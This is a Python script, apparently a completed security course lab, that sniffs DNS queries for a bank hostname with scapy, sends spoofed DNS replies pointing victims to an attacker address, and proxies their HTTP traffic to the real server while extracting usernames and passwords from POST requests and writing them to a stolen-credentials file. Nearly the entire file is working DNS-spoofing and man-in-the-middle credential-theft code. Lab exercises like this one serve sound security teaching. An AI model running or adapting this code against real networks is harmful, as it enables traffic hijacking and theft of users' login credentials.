import os
import argparse
import socket
from scapy.all import *
# from scapy.layers.dns import DNS, DNSRR
# from scapy.layers.inet import IP, UDP


conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"
HOST=''

IFACE = "lo"   # Or your default interface
DNS_SERVER_IP = "127.0.0.2"

# 127.0.0.1 Client
# 127.0.0.3 Attaquer
# 127.1.1.1 Real Host

def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	data_str = client_data.decode()
	if(('POST' not in data_str) or ('username' not in data_str) or ('password' not in data_str)):
		return
	after_username = (data_str.split('username=')[1])
	username = after_username.split("\'")[1]
	after_password = (data_str.split('password=')[1])
	password = after_password.split("\'")[1]
	log_credentials(username,password)

def check_will_to_logout(client_data): # if client_data is a logout request return true
	data_str = client_data.decode()
	if (('POST' not in data_str) or ('post_logout' not in data_str)):
		return False
	return True


def handle_tcp_forwarding(attaquer_socket, client_ip, hostname):
	# Continuously intercept new connection attaquer_sockets from the client
	# and initiate a connection with the host in order to forward data
	while True:
		# accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		client_socket, addr = attaquer_socket.accept()
		host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))

		# read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.

		data_from_client = client_socket.recv(50000)
		host_socket.sendall(data_from_client)
		if not data_from_client:
			break
		check_credentials(data_from_client)
		end = check_will_to_logout(data_from_client)
		data_from_server = host_socket.recv(50000)
		client_socket.sendall(data_from_server)
		if(end):
			return





def dns_callback(packet, extra_args): # extra_args = (source_ip, attacker_socket)
	# Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	queryName = (packet[DNS].qd.qname)[:-1].decode()
	client_ip = packet[IP].src
	if(queryName != HOSTNAME):
		print('query name is different from HOSTNAME')
		return
	# Construct the IP header by looking at the sniffed packet
	ip = IP(
		src=packet[IP].dst,
		dst=packet[IP].src
	)
	# Construct the UDP header by looking at the sniffed packet
	udp = UDP(
		dport=packet[UDP].sport,
		sport=packet[UDP].dport
	)
	# Construct the DNS response by looking at the sniffed packet and manually
	dns = DNS(
		id=packet[DNS].id,
		qd=packet[DNS].qd,
		aa=1,
		rd=0,
		qr=1,
		qdcount=1,
		ancount=1,
		nscount=0,
		arcount=0,
		ar=DNSRR(
			rrname=packet[DNS].qd.qname,
			type='A',
			ttl=600,
			rdata=extra_args[0])
	)
	# Put the full packet together
	response_packet = ip / udp / dns
	# Send the DNS response
	send(response_packet, iface=IFACE)
	handle_tcp_forwarding(extra_args[1],client_ip , queryName)


def sniff_and_spoof(source_ip):# source ip is the ip of the attacker
	# Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	attacker_socket.bind((source_ip, WEB_PORT))
	attacker_socket.listen()
	# sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments.
	BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
	cb = lambda x : dns_callback(x,(source_ip,attacker_socket))
	sniff(filter=BPF_FILTER,prn=cb, iface=IFACE,count=1)



def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
